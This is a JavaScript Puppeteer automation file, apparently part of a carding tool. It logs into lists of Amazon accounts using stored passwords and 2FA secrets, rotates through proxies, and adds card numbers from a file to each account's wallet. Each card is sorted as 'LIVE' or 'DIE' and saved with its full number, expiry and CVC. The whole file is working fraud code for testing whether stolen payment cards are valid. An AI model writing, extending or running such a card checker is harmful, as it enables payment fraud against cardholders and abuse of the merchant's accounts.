const fs = require('fs');
const path = require('path');
const puppeteer = require('puppeteer');
const windowManager = require('./windowManager');
const sharedCardQueue = require('./sharedCardQueue');

const accounts = fs.readFileSync(path.join(__dirname, '..', 'data', 'acc.txt'), 'utf8')
    .replaceAll('\r', '')
    .split('\n')
    .map(line => line.trim())
    .filter(Boolean);

const proxies = fs.readFileSync(path.join(__dirname, '..', 'data', 'proxies.txt'), 'utf8')
    .replaceAll('\r', '')
    .split('\n')
    .map(line => line.trim())
    .filter(Boolean);

let currentProxyIndex = 0;
let maxConcurrentWindows = 1; // Will be set at runtime in updateNormal()

function parseProxyLine(line) {
    const value = String(line || '').trim();
    if (!value) return null;

    if (value.includes('|')) {
        const [hostPort, username, password] = value.split('|').map(part => part.trim());
        const [host, port] = hostPort.split(':').map(part => part.trim());
        return host && port ? { host, port, username, password } : null;
    }

    const [host, port, username, password] = value.split(':').map(part => part.trim());
    return host && port ? { host, port, username, password } : null;
}

function normalizeCardLine(cardLine) {
    const [number, monthRaw, yearRaw, cvc, ...nameParts] = String(cardLine || '').split('|');
    if (!number || !monthRaw || !yearRaw || !cvc) return null;

    const month = monthRaw.length === 1 ? `0${monthRaw}` : monthRaw;
    const year = yearRaw.length === 2 ? `20${yearRaw}` : yearRaw;
    const name = nameParts.join('|').trim() || 'Saint David';

    return {
        number: number.trim(),
        month: month.trim(),
        year: year.trim(),
        cvc: cvc.trim(),
        name,
        raw: cardLine
    };
}

function appendCardResult(kind, card, email, reason = '') {
    const status = kind === 'live' ? 'LIVE' : 'DIE';
    const base = `${status}|${card.number}|${card.month}|${card.year}|${card.cvc}`;
    const namePart = card.name ? `|${card.name}` : '';
    const accountPart = email ? `|Account:${email}` : '';
    const reasonPart = reason ? `|Reason:${reason}` : '';
    const line = `${base}${namePart}${accountPart}${reasonPart}`;

    if (console.card && typeof console.card[kind] === 'function') {
        console.card[kind](line);
        return;
    }

    const today = new Date();
    const formattedDate = `${today.getFullYear()}-${String(today.getMonth() + 1).padStart(2, '0')}-${String(today.getDate()).padStart(2, '0')}`;
    const dirSave = global.data.dirSave || path.join(__dirname, '..', '..', 'output', formattedDate);
    fs.mkdirSync(dirSave, { recursive: true });
    fs.appendFileSync(path.join(dirSave, `${kind}.txt`), line + '\n', 'utf8');
}

async function returnToWallet(page) {
    try {
        await page.goto('https://www.amazon.com/cpe/yourpayments/wallet', {
            waitUntil: 'domcontentloaded',
            timeout: 45000
        });
        await new Promise(resolve => setTimeout(resolve, 2500));
    } catch (error) {
        console.log(`WARN Could not return to wallet: ${error.message}`);
    }
}

async function updateNormal() {
    // ✅ RESET STATE FOR NEW RUN
    currentProxyIndex = 0;
    
    // ✅ Use numChrome from UI config, fallback to proxy count, minimum 1
    maxConcurrentWindows = (global.uiConfig && global.uiConfig.numChrome) 
        ? global.uiConfig.numChrome 
        : Math.max(proxies.length, 1);
    
    windowManager.reset();
    console.log(`🖥️ Max concurrent Chrome: ${maxConcurrentWindows}`);
    console.app(`🖥️ Max concurrent Chrome: ${maxConcurrentWindows}`);
    console.log('Starting normal login process...');
    console.app('Starting normal login process...');

    const cardPath = path.join(__dirname, '..', 'data', 'card.txt');
    const cardLines = fs.existsSync(cardPath)
        ? fs.readFileSync(cardPath, 'utf8').replace(/\r/g, '').split('\n').map(v => v.trim()).filter(Boolean)
        : [];
    sharedCardQueue.initialize(cardLines, true);
    if (console.card && typeof console.card.setTotal === 'function') {
        console.card.setTotal(cardLines.length);
    }
    if (sharedCardQueue.remainingCount() === 0) {
        console.app('No unclaimed cards available. Clear src/data/checkcard.txt if you want to run these cards again.');
        return;
    }

    if (accounts.length === 0) {
        console.log('No accounts found in acc.txt');
        console.app('No accounts found in acc.txt');
        return;
    }

    let currentAccountIndex = 0;
    while (currentAccountIndex < accounts.length) {
        const batch = [];
        for (let i = 0; i < maxConcurrentWindows && currentAccountIndex < accounts.length; i++) {
            batch.push({ accountLine: accounts[currentAccountIndex], index: currentAccountIndex });
            currentAccountIndex++;
        }

        await Promise.allSettled(batch.map(item => processAccount(item.accountLine, item.index)));
    }

    console.log('All normal logins completed!');
    console.app('All normal logins completed!');
}

async function processAccount(accountLine, index) {
    const [email, pass, secret] = accountLine.split('|');
    if (!email || !pass || !secret) {
        console.log(`Invalid account data: ${accountLine}`);
        console.app(`Invalid account data: ${accountLine}`);
        return;
    }

    let proxy = null;
    if (proxies.length > 0) {
        proxy = parseProxyLine(proxies[currentProxyIndex % proxies.length]);
        currentProxyIndex++;
    }

    let browser;
    try {
        const windowPosition = windowManager.getNextPosition();
        const userDataDir = path.join(__dirname, '..', 'data', 'chrome-profiles', `normal-${Date.now()}-${index}-${Math.random().toString(16).slice(2)}`);
        const defaultProfileDir = path.join(userDataDir, 'Default');
        fs.mkdirSync(defaultProfileDir, { recursive: true });
        fs.writeFileSync(path.join(defaultProfileDir, 'Preferences'), JSON.stringify({
            credentials_enable_service: false,
            profile: {
                password_manager_enabled: false,
                password_manager_leak_detection: false
            },
            autofill: {
                profile_enabled: false,
                credit_card_enabled: false,
                credit_card_fido_auth_enabled: false
            },
            payments: {
                can_make_payment_enabled: false
            }
        }, null, 2), 'utf8');

        const launchOptions = {
            headless: !global.data.settings.showBrowser,
            userDataDir,
            args: [
                '--no-sandbox',
                '--disable-setuid-sandbox',
                '--disable-web-security',
                '--ignore-certificate-errors',
                '--disable-infobars',
                '--disable-dev-shm-usage',
                `--window-position=${windowPosition.x},${windowPosition.y}`,
                `--window-size=${windowPosition.width},${windowPosition.height}`,
                '--disable-extensions',
                '--disable-gpu',
                '--disable-save-password-bubble',
                '--disable-autofill-keyboard-accessory-view',
                '--disable-autofill-keyboard-accessory',
                '--disable-autofill-type-predictions',
                '--disable-features=AutofillServerCommunication,AutofillEnableAccountWalletStorage,PasswordManagerOnboarding,PasswordManagerSettingsMigration',
                '--disable-password-generation',
                '--disable-password-manager-reauthentication',
                '--password-store=basic',
                '--use-mock-keychain',
                '--disable-translate'
            ],
            defaultViewport: null
        };

        if (proxy && proxy.host && proxy.port) {
            launchOptions.args.push(`--proxy-server=${proxy.host}:${proxy.port}`);
        }

        browser = await puppeteer.launch(launchOptions);
        const page = await browser.newPage();

        if (proxy && proxy.username && proxy.password) {
            await page.authenticate({
                username: proxy.username,
                password: proxy.password
            });
        }

        console.log(`Attempting normal login for: ${email}`);
        console.app(`Attempting normal login for: ${email}`);

        await require(path.join(__dirname, '..', 'api', 'login.js'))(page, {
            email,
            pass,
            code: secret,
            proxy
        });

        await new Promise(resolve => setTimeout(resolve, 3000));

        // Follow-up action similar to business flow: resolve account switcher if it appears.
        try {
            const switcherHeaderExists = await page.evaluate(() => !!document.querySelector('#cvf-filtered-account-switcher-header-text'));
            if (switcherHeaderExists) {
                console.log(`Account switcher detected for ${email}, selecting personal account...`);
                console.app(`Account switcher detected for ${email}, selecting personal account...`);

                const clicked = await page.evaluate(() => {
                    const customerName = document.querySelector('[data-test-id="customerName"]');
                    if (customerName) {
                        customerName.click();
                        return true;
                    }
                    const accountTypes = Array.from(document.querySelectorAll('[data-test-id="accountType"]'));
                    const personal = accountTypes.find(el => (el.textContent || '').toLowerCase().includes('personal account'));
                    if (personal) {
                        personal.click();
                        return true;
                    }
                    return false;
                });

                if (clicked) {
                    try {
                        await Promise.race([
                            page.waitForNavigation({ timeout: 15000 }),
                            new Promise(resolve => setTimeout(resolve, 4000))
                        ]);
                    } catch (_) {}
                }
            }
        } catch (_) {}

        if (global.data.settings.addAddress) {
            // Post-login action: open Addresses page and click "Add Address" tile.
            try {
                await page.goto('https://www.amazon.com/a/addresses?ref_=ya_d_c_addr', {
                    waitUntil: 'domcontentloaded',
                    timeout: 45000
                });
                await new Promise(resolve => setTimeout(resolve, 2500));

                const clickedAddAddress = await page.evaluate(() => {
                    const selectors = [
                        '.first-desktop-address-tile',
                        '#ya-myab-plus-address-icon',
                        '.add-address-text',
                        '[data-a-modal-trigger*="add"]'
                    ];

                    for (const selector of selectors) {
                        const el = document.querySelector(selector);
                        if (!el) continue;
                        const clickable = el.closest('.first-desktop-address-tile') || el;
                        try { clickable.scrollIntoView({ block: 'center' }); } catch (_) {}
                        try {
                            clickable.click();
                            return { success: true, selector };
                        } catch (_) {
                            try {
                                clickable.dispatchEvent(new MouseEvent('click', { bubbles: true, cancelable: true, view: window }));
                                return { success: true, selector: `${selector}:dispatch` };
                            } catch (_) {}
                        }
                    }
                    return { success: false };
                });

                if (clickedAddAddress.success) {
                    console.log(`Clicked Add Address tile using selector: ${clickedAddAddress.selector}`);
                    console.app(`Clicked Add Address tile using selector: ${clickedAddAddress.selector}`);
                    await new Promise(resolve => setTimeout(resolve, 2000));
                } else {
                    console.log(`Add Address tile not found for ${email}, trying direct add-address URL...`);
                    console.app(`Add Address tile not found for ${email}, trying direct add-address URL...`);
                }

                const hasAddressForm = await page.$('#address-ui-widgets-enterAddressPhoneNumber');
                if (!hasAddressForm) {
                    const directAddUrls = [
                        'https://www.amazon.com/a/addresses/add?ref_=ya_d_c_addr',
                        'https://www.amazon.com/a/addresses/add'
                    ];
                    for (const url of directAddUrls) {
                        try {
                            await page.goto(url, { waitUntil: 'domcontentloaded', timeout: 45000 });
                            await new Promise(resolve => setTimeout(resolve, 2000));
                            const found = await page.$('#address-ui-widgets-enterAddressPhoneNumber');
                            if (found) break;
                        } catch (_) {}
                    }
                }

                try {
                    const addressApi = require(path.join(__dirname, '..', 'api', 'addAddress.js'));
                    await addressApi.addAddress(page, { apiRetries: 1 });
                    console.log(`Address flow completed for ${email}`);
                    console.app(`Address flow completed for ${email}`);
                } catch (addAddressError) {
                    console.log(`Address form flow failed for ${email}: ${addAddressError.message}`);
                    console.app(`Address form flow failed for ${email}: ${addAddressError.message}`);
                }
            } catch (addressPageError) {
                console.app(`Address page flow failed for ${email}: ${addressPageError.message}`);
            }
        } else {
            console.app(`Skip address for ${email}`);
        }

            // Continue with card flow similar to scan/check flow.
            try {
                // For normal accounts, go directly to consumer wallet to avoid business-only routing.
                await page.goto('https://www.amazon.com/cpe/yourpayments/wallet', {
                    waitUntil: 'domcontentloaded',
                    timeout: 45000
                });
                await new Promise(resolve => setTimeout(resolve, 1500));

                if (sharedCardQueue.remainingCount() === 0) {
                    console.log(`No shared cards available for ${email}`);
                    console.app(`No shared cards available for ${email}`);
                } else {
                    const addCard = require(path.join(__dirname, '..', 'api', 'addCard.js'));

                    let liveCount = 0;
                    let dieCount = 0;

                    while (true) {
                        if (!page || page.isClosed()) {
                            console.app(`Page closed for ${email}, stop claiming shared cards`);
                            break;
                        }

                        const card = sharedCardQueue.claimNextCard(email);
                        if (!card) {
                            console.log(`No more shared cards for ${email}`);
                            console.app(`No more shared cards for ${email}`);
                            break;
                        }

                        const form = {
                            number: card.number,
                            month: card.month,
                            year: card.year,
                            name: card.name,
                            cvc: card.cvc
                        };

                        console.log(`Processing shared card ***${card.number.slice(-4)} for ${email}`);
                        console.app(`Processing shared card ***${card.number.slice(-4)} for ${email}`);

                        const res = await addCard(page, form);

                        if (res.success) {
                            liveCount++;
                            appendCardResult('live', card, email);
                            console.log(`LIVE card ***${card.number.slice(-4)} for ${email}`);
                            console.app(`LIVE card ***${card.number.slice(-4)} for ${email}`);
                        } else {
                            const reason = res.step || res.error ? ` (${res.step || 'unknown_step'}: ${res.error || 'unknown_error'})` : '';
                            dieCount++;
                            appendCardResult('die', card, email, reason.replace(/^\s*\(|\)\s*$/g, ''));
                            console.log(`DIE card ***${card.number.slice(-4)} for ${email}${reason}`);
                            console.app(`DIE card ***${card.number.slice(-4)} for ${email}${reason}`);

                            const fatalReason = `${res.step || ''} ${res.error || ''}`.toLowerCase();
                            if (fatalReason.includes('page_closed') || fatalReason.includes('detached frame') || fatalReason.includes('session closed')) {
                                console.app(`Fatal page/frame error for ${email}, stop claiming shared cards`);
                                break;
                            }
                        }

                        await returnToWallet(page);
                    }

                    console.log(`Card flow completed for ${email}: ${liveCount} live, ${dieCount} die`);
                    console.app(`Card flow completed for ${email}: ${liveCount} live, ${dieCount} die`);
                }
            } catch (cardFlowError) {
                console.log(`Card flow failed for ${email}: ${cardFlowError.message}`);
                console.app(`Card flow failed for ${email}: ${cardFlowError.message}`);
            }
        console.log(`Successfully logged in: ${email}`);
        console.app(`Successfully logged in: ${email}`);
    } catch (error) {
        console.log(`Normal login failed [${index + 1}] ${email}: ${error.message}`);
        console.app(`Normal login failed [${index + 1}] ${email}: ${error.message}`);
    } finally {
        if (browser) {
            await browser.close();
        }
    }
}

module.exports = updateNormal;
